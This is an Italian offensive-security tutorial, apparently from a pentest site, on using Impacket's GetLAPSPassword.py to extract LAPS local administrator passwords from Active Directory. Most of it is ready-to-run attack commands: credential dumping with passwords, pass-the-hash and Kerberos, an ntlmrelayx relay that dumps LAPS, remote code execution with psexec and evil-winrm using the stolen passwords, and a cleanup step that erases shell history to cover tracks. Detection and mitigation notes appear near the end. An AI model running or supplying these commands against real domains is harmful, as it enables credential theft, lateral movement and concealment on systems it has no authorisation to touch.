---
title: 'GetLAPSPassword.py: Recuperare Password LAPS con Impacket'
slug: getlapspassword
description: 'Guida a GetLAPSPassword.py di Impacket per recuperare password Legacy LAPS e Windows LAPS cifrate da Active Directory con password, hash NTLM o Kerberos.'
image: /getlapspassword-py-dump-password-laps.webp
draft: true
date: 2026-07-27T00:00:00.000Z
categories:
  - tools
subcategories:
  - post-exploit
tags:
  - getlapspassword
  - impacket
  - credential-dumping
  - ldap
  - kerberos
---

# GetLAPSPassword.py — Leggere le Password LAPS con Impacket

`GetLAPSPassword.py` (wrapper: `impacket-GetLAPSPassword` — il casing conta, Linux distingue maiuscole e minuscole) fa parte di [Impacket](https://hackita.it/articoli/impacket/) ed estrae le password degli amministratori locali gestite da LAPS direttamente da LDAP. Non richiede necessariamente Domain Admin: richiede un'identità che possa leggere l'attributo giusto sull'oggetto computer — e, per le password Windows LAPS cifrate, anche essere autorizzata a decifrarle.

Riferimento ufficiale: [fortra/impacket — GetLAPSPassword.py](https://github.com/fortra/impacket/blob/master/examples/GetLAPSPassword.py)

## Legacy LAPS, Windows LAPS cleartext e Windows LAPS cifrato — non sono la stessa cosa

Esistono tre varianti di storage, non due, e il tool le tratta in modo diverso:

| Storage                | Attributo                  | Il tool lo elabora?                                                                          |
| ---------------------- | -------------------------- | -------------------------------------------------------------------------------------------- |
| Legacy Microsoft LAPS  | `ms-Mcs-AdmPwd`            | Sì — testo in chiaro                                                                         |
| Windows LAPS in chiaro | `msLAPS-Password`          | **No** — il filtro di ricerca lo include, ma il codice attuale non ha un ramo che lo elabori |
| Windows LAPS cifrato   | `msLAPS-EncryptedPassword` | Sì — tramite decrittazione DPAPI-NG via MS-GKDI                                              |

Questo è un limite concreto del codice attuale, non un'ipotesi: la query LDAP cerca oggetti con uno qualsiasi dei tre attributi valorizzati, ma nel ciclo che processa i risultati esiste un `elif` per `msLAPS-EncryptedPassword` e uno per `ms-Mcs-AdmPwd` — nessun ramo gestisce `msLAPS-Password`. Un computer con Windows LAPS in chiaro può quindi comparire nella query ma non finire mai nell'output.

**Conseguenza pratica:** un output vuoto o incompleto non significa automaticamente "nessun permesso". Può anche voler dire che quell'host usa `msLAPS-Password` e questa versione del tool semplicemente non lo sa leggere.

## Chi può leggere — e chi può decifrare

Per **legacy LAPS** e **Windows LAPS in chiaro**, la barriera è una sola: poter leggere l'attributo LDAP. In molti ambienti questo permesso è delegato a gruppi (helpdesk, sysadmin, SOC) più ampi del previsto — è lì che si trova spesso la misconfiguration.

Per **Windows LAPS cifrato** servono **due condizioni distinte**:

1. poter leggere `msLAPS-EncryptedPassword` (permesso LDAP)
2. essere autorizzati a decifrare il blob, secondo il security principal configurato per la cifratura (`ADPasswordEncryptionPrincipal`)

Avere il primo permesso senza il secondo ti fa vedere un blob cifrato illeggibile, non una password.

Trova chi ha questi permessi con [BloodHound](https://hackita.it/articoli/bloodhound/) — l'edge si chiama **ReadLAPSPassword** e copre sia gli attributi legacy sia quelli Windows LAPS. Anche `AllExtendedRights` su un computer object può conferire questa capacità.

```bash
# Con nxc — verifica se il tuo utente ha accesso LAPS
nxc ldap 10.10.10.5 -u user -p pass -M laps --options
nxc ldap 10.10.10.5 -u user -p pass -M laps

# Lato difesa/enumerazione più precisa, via PowerShell (Windows LAPS)
Find-LapsADExtendedRights -Identity "OU=Workstations,DC=hackita,DC=local"

# Equivalente per legacy LAPS, con il modulo storico AdmPwd.PS
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
```

**Se la decrittazione fallisce ma vuoi capire perché:** il cmdlet nativo `Get-LapsADPassword` (quando esegui da un host Windows con i moduli PowerShell installati) restituisce metadati anche quando non riesce a decifrare — campi come `Source`, `DecryptionStatus` e soprattutto `AuthorizedDecryptor`. Quest'ultimo ti dice **per quale principal** è stato cifrato il blob: un tentativo fallito con `GetLAPSPassword.py` può quindi trasformarsi in un nuovo obiettivo di privilege escalation (comprometti quel principal, poi ritenta). Impacket non espone questo dettaglio — se ti serve, il cmdlet PowerShell nativo è l'unico modo per ottenerlo.

## Sintassi e opzioni reali

```bash
impacket-GetLAPSPassword [opzioni] dominio[/utente[:password]]
```

Nota: il positional argument **non include** `@target` come molti altri tool Impacket — solo `dominio[/utente[:password]]`. La destinazione LDAP viene risolta dal dominio stesso o da `-dc-ip`/`-dc-host`.

| Opzione                        | Descrizione                                                                                                                                 |
| ------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------- |
| `-computer NOME`               | Legge solo la password di un host specifico                                                                                                 |
| `-ldaps`                       | Abilita LDAPS — **richiesto specificamente quando interroghi un DC Windows Server 2025 con LDAPS enforced**, non genericamente per "LAPSv2" |
| `-outputfile FILE` / `-o FILE` | Salva output su file (le due forme sono alias)                                                                                              |
| `-hashes LM:NT`                | Pass-the-Hash                                                                                                                               |
| `-aesKey KEY`                  | Chiave AES (128/256 bit) per Kerberos                                                                                                       |
| `-k`                           | Autenticazione Kerberos                                                                                                                     |
| `-no-pass`                     | Con `-k`, non chiedere password                                                                                                             |
| `-dc-ip IP`                    | IP del Domain Controller                                                                                                                    |
| `-dc-host HOST`                | Hostname del DC — utile con Kerberos per coerenza tra principal e risoluzione                                                               |
| `-ts`                          | Timestamp nei log                                                                                                                           |
| `-debug`                       | Output diagnostico                                                                                                                          |

## `-ldaps` non decifra nulla — protegge solo il trasporto

Questo è l'equivoco più diffuso su questo tool. `-ldaps` cifra la connessione LDAP: è necessario quando il DC (in particolare Windows Server 2025 con enforcement attivo) o le policy dell'ambiente impediscono di leggere attributi riservati tramite una sessione LDAP non cifrata.

**Non è il meccanismo che decifra `msLAPS-EncryptedPassword`.** Quella decrittazione passa da un canale completamente diverso: quando il tool trova questo attributo, analizza il blob DPAPI-NG e contatta il servizio **MS-GKDI** tramite DCE/RPC su `ncacn_ip_tcp` (RPC over TCP, quindi endpoint mapper su 135 e porte dinamiche) per ottenere il materiale crittografico necessario, poi deriva la chiave e decifra localmente. LDAP/LDAPS ti serve per leggere il blob; MS-GKDI ti serve per aprirlo.

```
Attributo msLAPS-EncryptedPassword trovato
        │
        ▼
Parsing del blob CMS/DPAPI-NG (KeyIdentifier, SID del principal)
        │
        ▼
RPC over TCP verso MS-GKDI (GkdiGetKey, opnum 0) → root key
        │
        ▼
Derivazione KEK → unwrap della CEK → decrittazione AES
        │
        ▼
JSON in chiaro: {"n": "username", "p": "password", "t": timestamp}
```

Per approfondire l'implementazione di MS-GKDI in Python, [dpapi-ng di @jborean93](https://github.com/jborean93/dpapi-ng) è il riferimento diretto; per il DPAPI più in generale, anche [dploot di @zblurx](https://github.com/zblurx/dploot) — lo stesso autore di questo tool — copre casi di decrittazione correlati.

## Utilizzo pratico

### Base — legge tutte le password LAPS trovate

```bash
impacket-GetLAPSPassword hackita.local/user:Password123 -dc-ip 10.10.10.5
```

Output:

```
Host        LAPS Username   LAPS Password     LAPS Password Expiration   LAPSv2
----------  -------------   ---------------   ------------------------   ------
WS01$       N/A             K9!mPqR@2vXn8s    2025-02-20 14:52:44        False
WS02$       laps_admin      hp$R/UVbP}6t5r    2025-02-20 14:15:54        True
```

`LAPS Username: N/A` per una riga con `LAPSv2: False` è normale — legacy LAPS non gestisce un username separato, la password è sempre per l'account Administrator locale predefinito.

### Con LDAPS (DC Windows Server 2025 con enforcement)

```bash
impacket-GetLAPSPassword hackita.local/user:Password123 -dc-ip 10.10.10.5 -ldaps
```

### Host specifico

```bash
impacket-GetLAPSPassword hackita.local/user:Password123 -dc-ip 10.10.10.5 -computer WS01
```

### Pass-the-Hash

```bash
impacket-GetLAPSPassword -hashes :NThash hackita.local/user -dc-ip 10.10.10.5
```

### Kerberos, con chiave AES

```bash
export KRB5CCNAME=/path/to/ticket.ccache

impacket-GetLAPSPassword hackita.local/user \
  -k -no-pass \
  -dc-host dc01.hackita.local \
  -dc-ip 10.10.10.5

# Con chiave AES al posto del ccache/hash
impacket-GetLAPSPassword hackita.local/user \
  -aesKey AES256KeyQui \
  -k \
  -dc-host dc01.hackita.local \
  -dc-ip 10.10.10.5
```

Non è una modalità "stealth" — è semplicemente materiale Kerberos alternativo a password o hash RC4.

### Salva output

```bash
impacket-GetLAPSPassword hackita.local/user:Password123 -dc-ip 10.10.10.5 -o /tmp/laps_dump.txt
```

## Alternative — altri modi per leggere LAPS

### NetExec

```bash
nxc ldap 10.10.10.5 -u user -p pass -M laps
nxc ldap 10.10.10.5 -u user -p pass -M laps -o COMPUTER=WS01
```

### pyLAPS / LAPSDumper — alternative Python più datate

Prima che Impacket integrasse `GetLAPSPassword.py`, strumenti come **LAPSDumper** e **pyLAPS** facevano lo stesso lavoro da Linux, limitatamente a legacy LAPS (`ms-Mcs-AdmPwd`). Utili se ti serve qualcosa di estremamente minimale o se vuoi confrontare l'output, ma non gestiscono la decrittazione DPAPI-NG di Windows LAPS.

### ldapsearch manuale — legge il blob, non lo decifra

```bash
# Legacy LAPS
ldapsearch -x -H ldap://10.10.10.5 -D "user@hackita.local" -w pass \
  -b "DC=hackita,DC=local" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd sAMAccountName

# Windows LAPS in chiaro (msLAPS-Password) — quello che GetLAPSPassword.py non elabora
ldapsearch -x -H ldap://10.10.10.5 -D "user@hackita.local" -w pass \
  -b "DC=hackita,DC=local" "(msLAPS-Password=*)" msLAPS-Password msLAPS-PasswordExpirationTime sAMAccountName

# Windows LAPS cifrato — restituisce solo il blob, non la password
ldapsearch -x -H ldaps://10.10.10.5 -D "user@hackita.local" -w pass \
  -b "DC=hackita,DC=local" "(msLAPS-EncryptedPassword=*)" msLAPS-EncryptedPassword sAMAccountName
```

Il terzo comando dimostra solo che la tua identità può leggere il blob cifrato — non lo converte in username e password. Per quello serve il passaggio MS-GKDI che solo `GetLAPSPassword.py` (o strumenti equivalenti come `dpapi-ng`) automatizzano.

### ntlmrelayx — durante un relay attivo

```bash
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-laps --no-dump --no-da --no-acl
```

Non funziona "senza credenziali" in senso assoluto: usa l'identità NTLM relayata dalla vittima. Il risultato dipende dai permessi di quella specifica identità e dalla possibilità di fare relay verso LDAP/LDAPS — non è un metodo universale per qualunque configurazione Windows LAPS.

## Usare la password ottenuta — cosa aspettarsi davvero

La password è una credenziale locale valida per lo specifico computer — **non un accesso remoto garantito**. Serve anche, a seconda del metodo scelto:

* servizio remoto abilitato e raggiungibile (SMB 445, WinRM, RDP...)
* account locale corretto (spesso non è "Administrator", controlla la colonna `LAPS Username`)
* diritti di logon remoto per quell'account
* assenza di restrizioni UAC che filtrino il token amministrativo remoto

`laps_admin` è quasi sempre un account **locale** della macchina, non del dominio — va trattato come tale:

```bash
# Verifica prima, in modo poco invasivo
nxc smb WS01.hackita.local -u laps_admin -p 'hp$R/UVbP}6t5r' --local-auth

# psexec con contesto locale esplicito (non il dominio!)
impacket-psexec WS01/laps_admin:'hp$R/UVbP}6t5r'@WS01.hackita.local

# evil-winrm
evil-winrm -i WS01.hackita.local -u laps_admin -p 'hp$R/UVbP}6t5r'
```

**Non riusare la stessa password su altri host.** Il punto di LAPS è avere password diverse per ciascuna macchina — anche se il nome dell'account locale è identico su più host, testare la password di `WS01` su un'intera subnet vanifica il modello di sicurezza, genera autenticazioni fallite inutili, aumenta il rumore e può causare lockout. Il workflow corretto resta una mappatura uno-a-uno:

```
WS01 → laps_admin → password A
WS02 → laps_admin → password B
SRV01 → Administrator → password C
```

Da quella macchina, un dump di [credenziali in memoria](https://hackita.it/articoli/credential-dumping/) può rivelare sessioni di dominio se qualcuno vi è loggato — quello è il vero passo successivo per il movimento laterale, non il riuso della password LAPS stessa.

## Cosa restituisce davvero il tool

La query cerca oggetti `computer`, quindi può includere workstation, member server, Domain Controller e anche sistemi disabilitati ancora presenti in AD — non "tutte le workstation coperte da LAPS" come si potrebbe pensare. Windows LAPS può anche gestire la password DSRM dei Domain Controller quando configurato con cifratura abilitata.

Microsoft impone inoltre un limite hard di **1000 risultati** per qualsiasi ricerca LDAP — il tool usa una ricerca paginata per gestirlo, ma su domini enormi con più di 1000 computer LAPS-enabled può comunque servire più di una passata.

## Prerequisiti di rete

| Scenario                             | Porte necessarie                                                                 |
| ------------------------------------ | -------------------------------------------------------------------------------- |
| Legacy LAPS / Windows LAPS in chiaro | LDAP 389 o LDAPS 636                                                             |
| Windows LAPS cifrato                 | LDAP/LDAPS **più** TCP 135 (endpoint mapper) e porte RPC dinamiche verso MS-GKDI |

Il tool non usa mai SMB o named pipe per recuperare la password — solo LDAP/LDAPS e, per il caso cifrato, RPC puro.

## Errori comuni

| Problema                                                            | Causa possibile                                                                 | Verifica                                                                                  |
| ------------------------------------------------------------------- | ------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- |
| `No valid entry in LDAP`                                            | Nessun oggetto trovato con uno dei tre attributi                                | Verifica che LAPS sia effettivamente distribuito                                          |
| `No LAPS data returned`                                             | Oggetti trovati ma nessuno processabile                                         | Potrebbe essere `msLAPS-Password` non elaborato, non necessariamente mancanza di permessi |
| Password non appare per un host con `LAPSv2: True` visibile altrove | Serie di cause diverse, non solo "manca `-ldaps`"                               | Verifica se l'identità è autorizzata a **decifrare**, non solo a leggere l'attributo      |
| Errore durante il contatto con MS-GKDI                              | Porta 135/RPC dinamiche non raggiungibili, o non autorizzato alla decrittazione | Verifica connettività RPC verso il DC, non solo LDAP                                      |
| `LDAP error` legato a signing                                       | Il DC richiede una sessione cifrata per attributi riservati                     | Aggiungi `-ldaps`                                                                         |

## Detection e mitigazioni

**Detection:**

* Monitoraggio delle query LDAP verso gli attributi LAPS (`ms-Mcs-AdmPwd`, `msLAPS-Password`, `msLAPS-EncryptedPassword`)
* Auditing abilitato sugli attributi LAPS con `Set-LapsADAuditing`
* Connessioni RPC verso MS-GKDI da sorgenti non abituali
* Correlazione tra lettura della password e successiva autenticazione locale sullo stesso host
* Su Windows Server 2025, l'Event ID **3079** segnala una ricerca su un attributo riservato bloccata perché la sessione non era cifrata — il segnale più specifico per questo scenario
* Canale `Applications and Services Logs\Microsoft\Windows\LAPS\Operational`: Event **10041** (autenticazione riuscita con l'account gestito) e **10044** (rotazione post-authentication) indicano che l'account è stato effettivamente usato, non solo letto

**Mitigazioni:**

* Delegare `ReadLAPSPassword`/`AllExtendedRights` solo a gruppi realmente necessari, verificando periodicamente con BloodHound
* Abilitare la cifratura Windows LAPS con un `ADPasswordEncryptionPrincipal` ristretto
* Usare OU separate per workstation, server e Tier 0
* Abilitare le post-authentication actions (rotazione automatica subito dopo l'uso)
* Mantenere il Domain Functional Level adeguato per le funzionalità di cifratura Windows LAPS

## Cleanup

`GetLAPSPassword.py` è pura lettura — non modifica nulla in AD, quindi non serve alcun cleanup lato directory. Serve invece attenzione a cosa lasci in giro tu:

```bash
shred -u /tmp/laps_dump.txt
unset KRB5CCNAME
history -d "$(history 1 | awk '{print $1}')"
```

`shred` non garantisce cancellazione sicura su filesystem copy-on-write, con journaling, SSD o snapshot attivi — è un livello di igiene operativa, non una garanzia forense.

## Cheat Sheet

```bash
# Base
impacket-GetLAPSPassword hackita.local/user:pass -dc-ip DC_IP

# LDAPS (DC Windows Server 2025 enforced)
impacket-GetLAPSPassword hackita.local/user:pass -dc-ip DC_IP -ldaps

# Host specifico
impacket-GetLAPSPassword hackita.local/user:pass -dc-ip DC_IP -computer WS01

# Pass-the-Hash
impacket-GetLAPSPassword -hashes :NThash hackita.local/user -dc-ip DC_IP

# Kerberos con AES
impacket-GetLAPSPassword hackita.local/user -aesKey AES256KEY -k -dc-host DC01.hackita.local -dc-ip DC_IP

# Salva output
impacket-GetLAPSPassword hackita.local/user:pass -dc-ip DC_IP -o laps.txt

# Alternativa netexec
nxc ldap DC_IP -u user -p pass -M laps

# Alternativa ntlmrelayx (durante relay attivo)
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-laps --no-dump --no-da --no-acl

# Verifica prima di usare la credenziale (poco invasivo)
nxc smb TARGET -u laps_admin -p 'LAPS_PASSWORD' --local-auth

# Esecuzione remota con contesto locale corretto
impacket-psexec TARGET/laps_admin:'LAPS_PASSWORD'@TARGET
```

## Articoli correlati

* [Impacket: suite completa](https://hackita.it/articoli/impacket/)
* [BloodHound](https://hackita.it/articoli/bloodhound/)
* [ldapsearch](https://hackita.it/articoli/ldapsearch/)
* [ntlmrelayx.py](https://hackita.it/articoli/ntlmrelayx/)
* [psexec.py](https://hackita.it/articoli/psexec/)
* [Credential Dumping su Windows](https://hackita.it/articoli/credential-dumping/)
* [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash/)
* [Active Directory: guida all'exploitation](https://hackita.it/articoli/active-directory/)

> Uso esclusivo in ambienti autorizzati.
